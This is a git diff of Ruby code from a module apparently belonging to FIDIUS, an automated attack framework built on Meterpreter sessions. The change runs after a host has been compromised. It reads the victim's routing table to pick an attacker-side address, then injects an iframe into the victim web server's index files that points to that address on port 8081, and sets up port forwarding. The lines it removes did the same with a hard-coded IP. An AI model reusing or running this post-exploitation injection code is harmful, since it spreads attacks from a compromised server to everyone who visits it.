@@ -67,9 +67,25 @@ module FIDIUS
         session.load_stdapi
         add_route_to_session session
         #TODO Reco
-        #FIXME: get the local address of the interface the webautopwn is running on.
-        webserver_iframe = FIDIUS::Session::WebserverIFrameInjection.new session, "http://134.102.16.120:8080/"
-        webserver_iframe.localizeIndexFiles
+        #TODO make it dry
+        lhost = nil
+        session.net.config.each_route do |route|
+          # Remove multicast and loopback interfaces
+          next if route.subnet =~ /^(224\.|127\.)/
+          next if route.subnet == '0.0.0.0'
+          next if (IPAddr.new "#{route.subnet}/#{route.netmask}").include? IPAddr.new(FIDIUS::Session::get_rhost session)
+          if (route.subnet.split('.').last != '0') and (route.subnet.split('.').last != '255') then
+            lhost = route.subnet
+          end
+        end
+        if lhost != nil then
+          puts "LHOST FOR WEBINJECTION: --------------- : #{lhost}"
+          webserver_iframe = FIDIUS::Session::WebserverIFrameInjection.new session, "http://#{lhost}:8081"
+          webserver_iframe.localizeIndexFiles
+          webserver_iframe.establishPortFwd
+        else
+          puts "Couldn't inject Iframe LHost couldn't be identified!"
+        end
 #        install_meterpreter session
       rescue ::Exception
         puts "problem in session_action: #{$!} #{$!.backtrace}"
